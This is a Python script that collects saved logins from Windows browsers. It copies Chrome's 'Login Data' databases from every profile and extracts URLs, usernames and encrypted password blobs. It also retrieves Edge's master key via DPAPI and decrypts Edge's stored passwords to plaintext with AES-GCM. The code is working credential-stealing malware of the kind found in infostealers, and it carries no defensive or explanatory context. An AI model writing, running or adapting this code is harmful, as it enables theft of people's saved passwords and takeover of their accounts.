import os
import json
import base64
import shutil
import sqlite3
from Crypto.Cipher import AES
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import win32crypt

def find_chrome_profiles() -> list[tuple[str, str]]:
    base = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    profiles = []

    for name in os.listdir(base):
        if name == "Default" or name.startswith("Profile"):
            db = os.path.join(base, name, "Login Data")
            if os.path.isfile(db):
                profiles.append((name, db))

    return profiles

def collect_chrome_logins() -> dict:
    result = []
    profiles = find_chrome_profiles()
    for profile_name, db_path in profiles:
        tmp_db = os.path.join(os.getenv("TEMP"), f"{profile_name}_LoginData.db")
        shutil.copy2(db_path, tmp_db)

        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()

        for origin_url, username, pwd_blob in rows:
            pwd_b64 = base64.b64encode(pwd_blob).decode('ascii')
            result.append({
                "profile": profile_name,
                "site": origin_url,
                "user": username,
                "password_encrypted": pwd_b64
            })

        cursor.close()
        conn.close()
        os.remove(tmp_db)

    return {"logins": result}

def get_edge_user_data_path():
    user = os.getenv("USERNAME")

    return f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default"

def get_edge_encryption_key():
    user = os.getenv("USERNAME")
    local_state_path = f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Local State"

    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    return key

def decrypt_edge_password(password_encrypted, key):
    try:
        if password_encrypted.startswith(b'v10') or password_encrypted.startswith(b'v11'):
            password_encrypted = password_encrypted[3:]
            iv = password_encrypted[:12]
            payload = password_encrypted[12:]
            aesgcm = AESGCM(key)

            return aesgcm.decrypt(iv, payload, None).decode()
        else:
            return win32crypt.CryptUnprotectData(password_encrypted, None, None, None, 0)[1].decode()
    except Exception:
        return None

def collect_edge_logins() -> dict:
    user_data_path = get_edge_user_data_path()
    login_data_path = os.path.join(user_data_path, "Login Data")
    tmp_db = os.path.join(os.getenv("TEMP"), "Edge_LoginData.db")
    shutil.copy2(login_data_path, tmp_db)

    key = get_edge_encryption_key()
    result = []

    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for origin_url, username, pwd_encrypted in cursor.fetchall():
            if not pwd_encrypted:
                continue
            pwd = decrypt_edge_password(pwd_encrypted, key)
            result.append({
                "site": origin_url,
                "user": username,
                "password": pwd
            })
    finally:
        cursor.close()
        conn.close()
        os.remove(tmp_db)

    return {"logins": result}
